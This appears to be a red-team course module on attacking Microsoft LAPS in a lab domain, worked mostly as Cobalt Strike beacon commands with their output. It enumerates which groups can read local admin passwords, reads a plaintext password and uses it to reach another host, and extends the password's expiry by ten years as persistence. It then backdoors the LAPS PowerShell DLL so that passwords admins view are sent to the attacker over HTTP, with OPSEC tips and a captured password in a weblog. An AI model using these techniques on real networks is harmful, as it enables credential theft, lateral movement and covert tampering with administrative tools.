---
description: 10/04/2025
---

# ✅ Local Administrator Password Solution (LAPS)

## Introduction

Organizations will often build process for physical and virtual machines within their environment.

One common denominator with everything is that it is usually build from the same "gold image" to ensure consistency and compliance.&#x20;

However, these processes can result in every machine having the same password on accounts such as the local administrator.

If one machine and therefore the local administrator hash is compromised, an attacker may be able to move laterally to every machine in the domain using the same set of credentials.

### LAPS?

LAPS is a Microsoft solution for managing credentials of a local administrator account on every machine.

* Either the default RID 500 or a custom account!

It ensures that the password for each account is different, random, and automatically changed on a defined schedule.

Permission to request and reset the credentials can be delegated, which are also auditable.

### How LAPS Works

1. AD schema is extended and adds two new properties in computer objects called `ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationTime`.
2. By default, the DACL on ms-Mcs-AdmPwd only grants read access to Domain Admins. Each computer object is given permission to update these properties on itself.
3. Rights to read `AdmPwd` can be delegated to other principals (users, groups, etc.), which is typically done at the OU level.
4. A new GPO template is installed, which is used to deploy the LAPS configuration to machines (different policies can be applied to different OUs).
5. The LAPS client is installed on EVERY machine (through GPO or third-party software management solution).
6. When a machine performs a `gpupdate`, it will check the `AdmPwdExpirationTime` property on its own computer object in AD. If the time has elapsed, it will generate a new password (based on LAPS policy) and sets it on the `ms-Mcs-AdmPwd` property.

### Hunting for LAPS

There are a few methods to hunt for the presence of LAPS.&#x20;

**If it's applied to a machine that you have access to,&#x20;**<mark style="color:yellow;">**`AdmPwd.dll`**</mark>**&#x20;will be on disk:**

```
beacon> run hostname
wkstn-2

beacon> ls C:\Program Files\LAPS\CSE

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 179kb    fil     05/05/2021 07:04:14   AdmPwd.dll
```

**You can also search for GPOs that have "LAPS" or some other descriptive term in the name:**

```
beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

usncreated               : 25966
displayname              : LAPS
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{C6DC5466-785
                           A-11D2-84D0-00C04FB169F7}{942A8E4F-A261-11D1-A760-00C04FB9603F}][{D76B9641-3288-4F75-942D-08
                           7DE603E3EA}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]
whenchanged              : 8/16/2022 12:39:45 PM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 26068
dscorepropagationdata    : {9/7/2022 1:05:58 PM, 1/1/1601 12:00:00 AM}
name                     : {2BE4337D-D231-4D23-A029-7B999885E659}
flags                    : 1
cn                       : {2BE4337D-D231-4D23-A029-7B999885E659}
gpcfilesyspath           : \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}
distinguishedname        : CN={2BE4337D-D231-4D23-A029-7B999885E659},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
whencreated              : 8/16/2022 12:20:45 PM
versionnumber            : 17
instancetype             : 4
objectguid               : bbe274cc-6fcc-4e17-8804-bdc0ae952515
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=cyberbotic,DC=io
```

**Computer objects where the&#x20;**<mark style="color:yellow;">**`ms-Mcs-AdmPwdExpirationTime`**</mark>**&#x20;property is not null:**

```
beacon> powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

dnshostname              
-----------              
wkstn-2.dev.cyberbotic.io
web.dev.cyberbotic.io    
sql-2.dev.cyberbotic.io  
wkstn-1.dev.cyberbotic.io
```

**Upon locating the correct GPO, we can download the LAPS configuration from the&#x20;**<mark style="color:yellow;">**`gpcfilesyspath`**</mark>**:**

```
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 12:39:19   Applications
          dir     09/13/2022 15:38:58   Microsoft
          dir     08/16/2022 12:23:37   Preferences
          dir     08/16/2022 12:21:04   Scripts
 575b     fil     08/16/2022 12:22:23   comment.cmtx
 920b     fil     08/16/2022 12:22:23   Registry.pol

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol
[*] started download of \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol (920 bytes)
[*] download of Registry.pol is complete
```

**The `Parse-PolFile` cmdlet from the** [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) **package can be used to convert this file into human-readable format:**

```
PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordComplexity
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 3

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordLength
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 14

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordAgeDays
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 30

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdminAccountName
ValueType   : REG_SZ
ValueLength : 20
ValueData   : LapsAdmin

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdmPwdEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PwdExpirationProtectionEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 0
```

#### Output Overview

* Password complexity is upper, lower, and numbers
* Password length is 14
* Passwords are changed every 30 days
* The LAPS managed account name is `LapsAdmin`
* Password expiration protection is disabled

## Reading ms-Mcs-AdmPwd

**We can discover which principals are allowed to read the&#x20;**<mark style="color:yellow;">**`ms-Mcs-AdmPwd`**</mark>**&#x20;attribute by reading its DACL on each computer object:**

```
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

ObjectDN                                                      SecurityIdentifier                          
--------                                                      ------------------                          
CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io         S-1-5-21-569305411-121244042-2357301523-1107
CN=WEB,OU=Web Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io   S-1-5-21-569305411-121244042-2357301523-1108
CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io S-1-5-21-569305411-121244042-2357301523-1108
CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io         S-1-5-21-569305411-121244042-2357301523-1107

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108
DEV\Support Engineers
```

Dedicated tooling such as the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) also exist.&#x20;

<mark style="color:yellow;">**`Find-LAPSDelegatedGroups`**</mark>**&#x20;will query each OU and find domain groups that have delegated read access:**

```
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon> powershell Find-LAPSDelegatedGroups

OrgUnit                                              Delegated Groups     
-------                                              ----------------     
OU=Workstations,DC=dev,DC=cyberbotic,DC=io           DEV\Developers       
OU=Servers,DC=dev,DC=cyberbotic,DC=io                DEV\Support Engineers
OU=Web Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io DEV\Support Engineers
OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io DEV\Support Engineers
```

<mark style="color:yellow;">`Find-AdmPwdExtendedRights`</mark> goes a little deeper and queries each individual computer for users that have "All Extended Rights". &#x20;

This will reveal any users that can read the attribute without having had it specifically delegated to them.

**To get a computer's password, simply read the attribute:**

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd

ms-mcs-admpwd 
------------- 
1N3FyjJR5L18za
```

**The&#x20;**<mark style="color:yellow;">**`make_token`**</mark>**&#x20;command is an easy way to leverage it:**

```
beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
[+] Impersonated DEV\bfarmer

beacon> ls \\wkstn-1\c$
[*] Listing: \\wkstn-1\c$\

Size     Type    Last Modified         Name
----     ----    -------------         ----
          dir     08/16/2022 08:17:30   $Recycle.Bin
          dir     08/15/2022 22:22:31   $WinREAgent
          dir     01/27/2022 18:18:49   Documents and Settings
          dir     12/07/2019 09:14:52   PerfLogs
          dir     08/22/2022 00:15:03   Program Files
          dir     10/06/2021 13:57:25   Program Files (x86)
          dir     09/14/2022 09:50:27   ProgramData
          dir     08/17/2022 17:52:54   Recovery
          dir     09/14/2022 09:35:54   System Volume Information
          dir     08/16/2022 08:15:58   Users
          dir     09/09/2022 10:38:50   Windows
 8kb      fil     09/14/2022 08:12:19   DumpStack.log.tmp
 796mb    fil     09/14/2022 08:12:19   hiberfil.sys
 704mb    fil     09/14/2022 08:12:19   pagefile.sys
 16mb     fil     09/14/2022 08:12:19   swapfile.sys
```

## Password Expiration Protection

One of the LAPS policy settings is called "Do not allow password expiration time longer than required by policy".

In short, this is the `PwdExpirationProtectionEnabled` configuration that we read from the `Registry.pol` file.

When enabled, this policy will prevent a user or computer setting the expiration date of a password beyond the password age specified in the `PasswordAgeDays` setting.

We also read from `Registry.pol` that this is set to 30 days.

For instance, if a password is set on the 1st of January 2022, its expiration will be the 31st of January 2022.

If password expiration protection is enabled and we attempted to modify its expiration date beyond the 31st of January, it would trigger an automatic reset of that password.

If the policy setting is left "not configured" in the GPO, then password expiration protection is disabled by default.

Since we were able to compromise `WKSTN-1` using its LAPS password, we can set its expiration long into the future as a form of persistence.

**The expiration date is an 18-digit timestamp calculated as the number of 100-nanosecond intervals that have elapsed since the 1st of January 1601 (weird, I know):**

```
beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

ms-mcs-admpwdexpirationtime ms-mcs-admpwd 
--------------------------- ------------- 
         133101494718702551 1N3FyjJR5L18za
```

Where <mark style="color:yellow;">`133101494718702551`</mark> is Thursday, 13 October 2022 15:44:31 GMT.

{% hint style="info" %}
Use [https://www.epochconverter.com/ldap](https://www.epochconverter.com/ldap) as it can translate between these timestamps and human-readable formats.
{% endhint %}

If we wanted to <mark style="color:yellow;">push the expiry out by 10 years</mark>, we can overwrite this value with <mark style="color:yellow;">`136257686710000000`</mark>. &#x20;

**Every computer has delegated access to write to this password field, so we must elevate to `SYSTEM` on&#x20;**<mark style="color:yellow;">**`WKSTN-1`**</mark>**:**

```
beacon> run hostname
wkstn-1

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> powershell Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
Setting 'ms-Mcs-AdmPwdExpirationTime' to '136257686710000000' for object 'WKSTN-1$'
```

{% hint style="danger" %}
**OPSEC**\
\
**The expiration date will still be visible to admins and a manual reset will change the password and restore the expiration date.**\
\
![](https://files.cdn.thinkific.com/file_uploads/584845/images/411/f2f/065/laps-ui.png)
{% endhint %}

## LAPS Backdoors

There are some techniques that we can leverage to backdoor the LAPS administrative tooling and obtain a copy of password when viewed by an admin.

This module will demonstrate this idea using the LAPS PowerShell cmdlet <mark style="color:yellow;">`Get-AdmPwdPassword`</mark>.

**If installed on a machine, the LAPS PowerShell modules can be found under:&#x20;**<mark style="color:yellow;">**`C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS`**</mark>**:**

```
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/16/2022 13:04:13   en-US
 24kb     fil     05/05/2021 12:04:14   AdmPwd.PS.dll
 5kb      fil     04/28/2021 18:56:38   AdmPwd.PS.format.ps1xml
 4kb      fil     04/28/2021 18:56:38   AdmPwd.PS.psd1
 26kb     fil     05/05/2021 12:04:14   AdmPwd.Utils.dll
```

Since PowerShell heavily utilizes the `.NET` Framework, the DLLs here are written in C# which makes them fairly trivial to download, modify, and re-upload.

Download <mark style="color:yellow;">`AdmPwd.PS.dll`</mark> and <mark style="color:yellow;">`AdmPwd.Utils.dll`</mark>, sync them to your attacking machine and open <mark style="color:yellow;">`AdmPwd.PS.dll`</mark> with <mark style="color:green;">`dnSpy`</mark>.

**Use the Assembly Explorer to drill down into the DLL, namespaces, and classes until you find the&#x20;**<mark style="color:yellow;">**`GetPassword`**</mark> _**method**_**:**

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This _**method**_ calls <mark style="color:yellow;">`DirectoryUtils.GetPasswordInfo`</mark> which returns a <mark style="color:yellow;">`PasswordInfo`</mark> object. &#x20;

You can click on the name and <mark style="color:yellow;">`dnSpy`</mark> will take you to the _**class definition**_. &#x20;

It contains _**properties**_ for <mark style="color:yellow;">`ComputerName`</mark>, <mark style="color:yellow;">`DistinguishedName`</mark>, <mark style="color:yellow;">`Password`</mark> and <mark style="color:yellow;">`ExpirationTimestamp`</mark>. &#x20;

<mark style="color:green;">**The password is simply the plaintext password that is shown to the admin**</mark>**.**

Let's modify the code to send the plaintext passwords to us over an <mark style="color:yellow;">`HTTP GET`</mark> request.

{% hint style="danger" %}
**OPSEC WARNING**\
\
**This is obviously an&#x20;**_**irresponsible**_**&#x20;method to use in the real world, because the plaintext password is being sent unencrypted over the wire.  This is just an example.**
{% endhint %}

Go back to the `GetPassword` method, right-click somewhere in the main window and select **Edit Method**.

The first thing we need to do is add a new assembly reference, using the little button at the bottom of the edit window.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use this search box to find an add <mark style="color:yellow;">`System.Net`</mark>.

This code will simply instantiate a new <mark style="color:yellow;">`WebClient`</mark> and call the <mark style="color:yellow;">`DownloadString`</mark> method, passing the computer name and password in the URI.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Once the modifications are in place, click the&#x20;**_**Compile**_**&#x20;button in the bottom-right of the edit window.** &#x20;

**Then select&#x20;**_**File > Save Module**_**&#x20;to write the changes to disk.  Upload the DLL back to the target to overwrite the existing file:**

```
beacon> upload C:\Users\Attacker\Desktop\AdmPwd.PS.dll
```

**One downside to this tactic is that it will break the digital signature of the DLL, but it will not prevent PowerShell from using it:**

```
beacon> powershell Get-AuthenticodeSignature *.dll

    Directory: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS

SignerCertificate                         Status                                 Path                                  
-----------------                         ------                                 ----                                  
                                          NotSigned                              AdmPwd.PS.dll                         
ABDCA79AF9DD48A0EA702AD45260B3C03093FB4B  Valid                                  AdmPwd.Utils.dll 
```

**As `nlamb` on Workstation 1, grab the LAPS password for a computer:**

```
PS C:\Users\nlamb> Get-AdmPwdPassword -ComputerName sql-2 | fl

ComputerName        : SQL-2
DistinguishedName   : CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io
Password            : VloWch1sc5Hl40
ExpirationTimestamp : 9/17/2022 12:46:28 PM
```

**You should see a corresponding hit in your CS weblog:**

```
09/14 11:49:32 visit (port 80) from: 10.10.122.254
	Request: GET /
	Response: 404 Not Found
	null
	= Form Data=
	computer   = SQL-2
	pass       = VloWch1sc5Hl40
```
